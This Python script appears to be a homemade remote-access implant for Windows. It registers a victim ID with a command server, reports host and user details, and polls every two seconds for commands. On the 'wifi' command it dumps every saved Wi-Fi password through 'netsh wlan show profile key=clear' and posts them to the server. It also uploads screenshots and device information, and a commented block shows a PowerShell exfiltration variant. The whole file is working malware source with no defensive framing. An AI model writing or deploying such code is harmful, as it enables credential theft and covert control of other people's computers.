import subprocess, sys ,os,platform
import requests,json
from time import sleep
ID = "TARG1"
url = "http://127.0.0.1:105/ReadForm"
command = ""
datas = {
    'ID':ID,
    "pc": platform.platform(),
    "ip": "192.168.71",
    "user":os.getlogin(),
    "previlage":"non-admin"}

def sendrequest(url,data):
    r = requests.post(url,data)

def getwifi():
    meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
    data = meta_data.decode('utf-8', errors ="backslashreplace")
    data = data.split('\n')
    wifi = []
    for i in data:
        if "All User Profile" in i :
            i = i.split(":")
            i = i[1]
            i = i[1:-1]
            try:
                results = subprocess.check_output(f'netsh wlan show profile "{i}" key=clear',stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                print(e.output.decode())
                exit()
            results = results.decode('utf-8', errors ="backslashreplace")
            results = results.split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            wifi.append([i,results[0]])
    return wifi
sendrequest(url,data)
while True:
    r = requests.get(url)
    data = json.loads(r.content)
    if ID in data:
        ncommand = data[ID]
        if ncommand == command:
            pass
        else:
            command = ncommand
            print(command)
            if command == "screenshot":
                data = {
                'ID':"TARG1",
                'Type':"Screen"}
                files = {'file': open('vlcsnap-00001.png','rb')}
                print("sending screenshot")
                r = requests.post('http://127.0.0.1:105/file', data=data,files=files)
            if command == "wifi":
                data = {
                    'ID':ID,
                    "pc": platform.platform(),
                    "ip": "192.168.71",
                    "user":os.getlogin(),
                    "previlage":"non-admin",
                    "wifi":[getwifi()]}
                print("sending wifi")
                sendrequest(url,data)
            if command == "device-info":
                sendrequest(url,datas)
                

    sleep(2)
"""
    data = {
    'ID':"TARG1",
    "pc": "lenovo",
    "ip": "you@whatever.com"}
    r = requests.post("http://127.0.0.1:105/ReadForm",data)

    def cmd():
        data = "{'pc':'lenovo, 'ip':'1234:1234:1234'}"
        p = subprocess.Popen(f'powershell.exe Invoke-WebRequest -UseBasicParsing http://127.0.0.1:105/ReadForm -ContentType "application/json" -Method POST -Body "{data}"', stdout=sys.stdout,shell=True)
        return p.communicate()

    cmd()
"""